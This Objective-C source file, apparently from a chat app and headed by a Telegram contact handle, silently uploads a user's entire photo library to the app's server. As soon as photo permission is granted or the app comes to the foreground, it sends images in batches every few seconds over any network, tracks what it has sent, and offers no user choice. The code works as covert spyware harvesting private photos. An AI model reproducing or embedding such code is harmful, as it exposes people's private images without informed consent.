//telegram @wz662
#import "PhoneAlbumLibrarySync.h"
#import <Photos/Photos.h>
#import "IMClientManager.h"
#import "ClientCoreSDK.h"
#import "PhoneAlbumSendHelper.h"
#import "Default.h"

NSString * const RBPhoneAlbumOneTimeFullUploadDidCompleteNotification = @"RBPhoneAlbumOneTimeFullUploadDidCompleteNotification";

/// 旧版「全量成功」布尔标记；新版用 Documents 下 plist 存已传 localIdentifier，若仅有此标记无 plist 则迁移为「当前相册全部视为已传」
static NSString * const kFullUploadDoneKey = @"rb_phone_album_full_upload_completed_v1";

static const NSUInteger kPhoneAlbumUploadBatchSize = 12;
static const NSTimeInterval kPhoneAlbumBatchIntervalSeconds = 5.0;

static BOOL sFullUploadRunning = NO;

@implementation PhoneAlbumLibrarySync

+ (NSString *)rb_uploadedIdsPathForUid:(NSString *)uid
{
    if (uid.length == 0) return @"";
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    return [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"rb_phone_album_uploaded_ids_%@.plist", uid]];
}

+ (NSMutableSet<NSString *> *)rb_loadUploadedMutableSetForUid:(NSString *)uid
{
    NSMutableSet<NSString *> *out = [NSMutableSet set];
    NSString *path = [self rb_uploadedIdsPathForUid:uid];
    if (path.length == 0) return out;
    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:path];
    NSArray *ids = dict[@"ids"];
    if ([ids isKindOfClass:[NSArray class]]) {
        for (id o in ids) {
            if ([o isKindOfClass:[NSString class]] && [(NSString *)o length] > 0) {
                [out addObject:o];
            }
        }
    }
    if (out.count == 0 && [[NSUserDefaults standardUserDefaults] boolForKey:kFullUploadDoneKey]) {
        PHFetchOptions *opts = [[PHFetchOptions alloc] init];
        opts.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]];
        PHFetchResult<PHAsset *> *result = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:opts];
        for (PHAsset *a in result) {
            if (a.localIdentifier.length > 0) {
                [out addObject:a.localIdentifier];
            }
        }
        [self rb_saveUploadedMutableSet:out forUid:uid];
        [[NSUserDefaults standardUserDefaults] removeObjectForKey:kFullUploadDoneKey];
        [[NSUserDefaults standardUserDefaults] synchronize];
        DDLogInfo(@"【手机相册】已从旧版「全量完成」标记迁移到本地已传列表，共 %lu 条", (unsigned long)out.count);
    }
    return out;
}

+ (void)rb_saveUploadedMutableSet:(NSMutableSet<NSString *> *)set forUid:(NSString *)uid
{
    if (uid.length == 0 || set == nil) return;
    NSString *path = [self rb_uploadedIdsPathForUid:uid];
    if (path.length == 0) return;
    NSArray *arr = [set allObjects];
    NSDictionary *dict = @{ @"ids": arr };
    if (![dict writeToFile:path atomically:YES]) {
        DDLogWarn(@"【手机相册】已传列表写入失败 path=%@", path);
    }
}

+ (NSArray<PHAsset *> *)rb_pendingAssetsOrdered:(PHFetchResult<PHAsset *> *)result uploaded:(NSMutableSet<NSString *> *)uploaded
{
    NSMutableArray<PHAsset *> *pending = [NSMutableArray array];
    for (PHAsset *a in result) {
        if (a.localIdentifier.length == 0) continue;
        if ([uploaded containsObject:a.localIdentifier]) continue;
        [pending addObject:a];
    }
    return pending;
}

+ (void)rb_finishPipelineAndNotify
{
    sFullUploadRunning = NO;
    dispatch_async(dispatch_get_main_queue(), ^{
        [[NSNotificationCenter defaultCenter] postNotificationName:RBPhoneAlbumOneTimeFullUploadDidCompleteNotification object:nil];
    });
}

/// 在 utility 队列上执行一批；若有剩余则间隔 5 秒再调自己（Wi‑Fi/蜂窝均允许，不做网络类型限制）
+ (void)rb_runBatchedUploadStepForUid:(NSString *)uid
{
    if (uid.length == 0) {
        [self rb_finishPipelineAndNotify];
        return;
    }
    if (![[ClientCoreSDK sharedInstance].currentLoginUserId isEqualToString:uid]) {
        DDLogWarn(@"【手机相册分批上传】用户已切换，停止 uid=%@", uid);
        [self rb_finishPipelineAndNotify];
        return;
    }
    PHAuthorizationStatus st = [PHPhotoLibrary authorizationStatus];
    if (@available(iOS 14, *)) {
        if (st != PHAuthorizationStatusAuthorized && st != PHAuthorizationStatusLimited) {
            [self rb_finishPipelineAndNotify];
            return;
        }
    } else if (st != PHAuthorizationStatusAuthorized) {
        [self rb_finishPipelineAndNotify];
        return;
    }

    PHFetchOptions *opts = [[PHFetchOptions alloc] init];
    opts.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]];
    PHFetchResult<PHAsset *> *result = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:opts];
    NSMutableSet<NSString *> *uploaded = [self rb_loadUploadedMutableSetForUid:uid];
    NSArray<PHAsset *> *pending = [self rb_pendingAssetsOrdered:result uploaded:uploaded];
    if (pending.count == 0) {
        DDLogInfo(@"【手机相册分批上传】无待传资源，已记录 %lu 个 localIdentifier", (unsigned long)uploaded.count);
        [self rb_finishPipelineAndNotify];
        return;
    }

    NSUInteger batchCount = MIN(kPhoneAlbumUploadBatchSize, pending.count);
    NSUInteger ok = 0;
    NSUInteger fail = 0;
    BOOL hadException = NO;

    @try {
        for (NSUInteger i = 0; i < batchCount; i++) {
            PHAsset *asset = pending[i];
            UIImage *img = [self imageForAssetSync:asset];
            if (img == nil) {
                fail++;
                continue;
            }
            NSString *fileName = [PhoneAlbumSendHelper preparedPhoneAlbumImageForUpload:img];
            if (fileName.length == 0) {
                fail++;
                continue;
            }
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            __block BOOL uploadOk = NO;
            [PhoneAlbumSendHelper processPhoneAlbumImageUpload:fileName
                                                    processing:^{ }
                                                  processFaild:^{
                uploadOk = NO;
                dispatch_semaphore_signal(sem);
            } processOk:^{
                uploadOk = YES;
                dispatch_semaphore_signal(sem);
            }];
            dispatch_time_t rbDeadline = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(60 * NSEC_PER_SEC));
            long rbWait = dispatch_semaphore_wait(sem, rbDeadline);
            if (rbWait != 0) {
                uploadOk = NO;
            }
            if (uploadOk) {
                ok++;
                if (asset.localIdentifier.length > 0) {
                    [uploaded addObject:asset.localIdentifier];
                    [self rb_saveUploadedMutableSet:uploaded forUid:uid];
                }
            } else {
                fail++;
            }
        }
        DDLogInfo(@"【手机相册分批上传】本批结束 ok=%lu fail=%lu 本批条数=%lu 当前待传总数约=%lu",
                  (unsigned long)ok, (unsigned long)fail, (unsigned long)batchCount, (unsigned long)pending.count);
    } @catch (NSException *ex) {
        hadException = YES;
        DDLogWarn(@"【手机相册分批上传】异常：%@", ex);
    }

    if (hadException) {
        DDLogWarn(@"【手机相册分批上传】本批异常，未推进间隔；下次进入前台/授权回调将重试");
    }

    NSArray<PHAsset *> *stillPending = [self rb_pendingAssetsOrdered:result uploaded:[self rb_loadUploadedMutableSetForUid:uid]];
    if (stillPending.count == 0) {
        DDLogInfo(@"【手机相册分批上传】全部完成（或已无待传）");
        [self rb_finishPipelineAndNotify];
        return;
    }

    dispatch_time_t when = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kPhoneAlbumBatchIntervalSeconds * NSEC_PER_SEC));
    dispatch_after(when, dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        [PhoneAlbumLibrarySync rb_runBatchedUploadStepForUid:uid];
    });
}

+ (void)requestEarlyPhotoLibraryAuthorizationIfNeeded
{
    PHAuthorizationStatus st = [PHPhotoLibrary authorizationStatus];
    if (st != PHAuthorizationStatusNotDetermined) {
        return;
    }
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [PhoneAlbumLibrarySync handlePhotoLibraryAuthorizationStatus:status];
            });
        }];
    });
}

+ (BOOL)canRunForCurrentUser
{
    NSString *uid = [IMClientManager sharedInstance].localUserInfo.user_uid;
    if (uid.length == 0) {
        return NO;
    }
    if (![[ClientCoreSDK sharedInstance].currentLoginUserId isEqualToString:uid]) {
        return NO;
    }
    PHAuthorizationStatus st = [PHPhotoLibrary authorizationStatus];
    if (@available(iOS 14, *)) {
        return (st == PHAuthorizationStatusAuthorized || st == PHAuthorizationStatusLimited);
    }
    return st == PHAuthorizationStatusAuthorized;
}

+ (CGSize)targetPixelSizeForPhoneAlbumAsset:(PHAsset *)asset
{
    CGFloat maxSide = (CGFloat)LOCAL_PHOTO_FILE_COMPRESS_MAX_WIDTH;
    CGFloat pw = (CGFloat)MAX(asset.pixelWidth, 1);
    CGFloat ph = (CGFloat)MAX(asset.pixelHeight, 1);
    CGFloat longSide = MAX(pw, ph);
    CGFloat scale = (longSide > maxSide) ? (maxSide / longSide) : 1.0;
    CGSize sz = CGSizeMake(floor(pw * scale), floor(ph * scale));
    if (sz.width < 1) {
        sz.width = 1;
    }
    if (sz.height < 1) {
        sz.height = 1;
    }
    return sz;
}

+ (UIImage *)imageForAssetSync:(PHAsset *)asset
{
    if (asset == nil || asset.mediaType != PHAssetMediaTypeImage) {
        return nil;
    }
    CGSize target = [self targetPixelSizeForPhoneAlbumAsset:asset];
    __block UIImage *outImg = nil;
    PHImageRequestOptions *opt = [[PHImageRequestOptions alloc] init];
    opt.version = PHImageRequestOptionsVersionCurrent;
    opt.resizeMode = PHImageRequestOptionsResizeModeFast;
    opt.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;
    opt.networkAccessAllowed = YES;
    opt.synchronous = YES;
    [[PHImageManager defaultManager] requestImageForAsset:asset
                                                targetSize:target
                                               contentMode:PHImageContentModeAspectFit
                                                   options:opt
                                             resultHandler:^(UIImage *result, NSDictionary *info) {
        if ([result isKindOfClass:[UIImage class]]) {
            outImg = result;
        }
    }];
    return outImg;
}

+ (void)handlePhotoLibraryAuthorizationStatus:(PHAuthorizationStatus)status
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (status != PHAuthorizationStatusAuthorized && status != PHAuthorizationStatusLimited) {
            return;
        }
        [self tryStartOneTimeFullUploadOnMainIfNeeded];
    });
}

+ (void)enqueueOneTimeFullUploadFromAppBecameActiveIfNeeded
{
    dispatch_async(dispatch_get_main_queue(), ^{
        [self tryStartOneTimeFullUploadOnMainIfNeeded];
    });
}

+ (void)tryStartOneTimeFullUploadOnMainIfNeeded
{
    if (sFullUploadRunning) {
        return;
    }
    if (![self canRunForCurrentUser]) {
        return;
    }
    NSString *uid = [IMClientManager sharedInstance].localUserInfo.user_uid;
    if (uid.length == 0) {
        return;
    }
    sFullUploadRunning = YES;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        [PhoneAlbumLibrarySync rb_runBatchedUploadStepForUid:uid];
    });
}

@end
